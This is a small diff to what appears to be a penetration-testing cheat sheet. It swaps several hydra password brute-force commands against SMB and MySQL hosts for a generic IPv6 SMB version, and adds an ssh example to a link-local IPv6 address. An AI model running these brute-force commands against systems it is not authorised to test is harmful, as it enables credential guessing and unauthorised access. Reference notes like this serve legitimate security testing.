@@ -14,6 +14,9 @@
 ### IPv6 hydra Password Brute Force
 | for Example  |
 | ------------- |
-|hydra -l Administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 smb://[2001:db7::1234:1] |
-|hydra –L /root/Desktop/user.txt –P /root/Desktop/pass.txt 192.168.1.106 mysql |
-|hydra -L usernames.txt -P passwords.txt 192.168.2.66 mysql -V -f |
+|hydra -l Administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 smb://[IPv6] |
+
+### IPv6 Services
+| for Example  |
+| ------------- |
+|ssh carla@fe80::ea9a:8fff:fe67:190d%eth0 |
